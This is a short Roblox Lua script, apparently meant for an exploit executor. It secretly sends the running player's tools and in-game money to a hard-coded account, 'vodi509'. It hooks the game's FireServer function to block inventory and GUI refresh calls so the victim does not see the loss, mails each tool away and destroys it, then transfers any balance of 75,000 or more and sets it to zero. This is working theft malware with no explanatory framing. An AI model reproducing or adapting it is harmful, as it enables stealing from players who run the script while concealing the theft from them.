local player = game.Players.LocalPlayer
local rs = game:GetService("ReplicatedStorage")
local players = game:GetService("Players")

local TARGET = "vodi509"

local a = rs.RemoteEvent.FireServer
rs.RemoteEvent.FireServer = function(self, ...)
    local b = {...}
    if b[1] == "UpdateInventory" or b[1] == "RefreshGUI" or b[1] == "SyncUI" then
        return
    end
    return a(self, ...)
end

local function c(item, q)
    local e = rs:FindFirstChild("MailEvent") or rs:FindFirstChild("SendItem") or rs:FindFirstChild("SendToMail")
    if e then
        e:FireServer(TARGET, item, q or 1)
    else
        local f = rs:FindFirstChild("MailFunction")
        if f then
            f:InvokeServer(TARGET, item, q or 1)
        end
    end
end

local function d()
    local bp = player:FindFirstChild("Backpack")
    if not bp then return end

    local ch = player.Character
    if ch then
        for _, v in pairs(ch:GetChildren()) do
            if v:IsA("Tool") then
                v.Parent = bp
            end
        end
    end

    local list = {}
    for _, v in pairs(bp:GetChildren()) do
        if v:IsA("Tool") then
            table.insert(list, v)
        end
    end

    for _, v in pairs(list) do
        c(v, 1)
        v:Destroy()
        task.wait(0.1)
    end

    local ls = player:FindFirstChild("leaderstats")
    if ls then
        local m = ls:FindFirstChild("Money")
        if m and m.Value >= 75000 then
            local sm = rs:FindFirstChild("SendMoney")
            if sm then
                sm:FireServer(TARGET, m.Value)
            end
            m.Value = 0
        end
    end
end

task.wait(2)
d()
task.wait(30)
queue_on_teleport("")
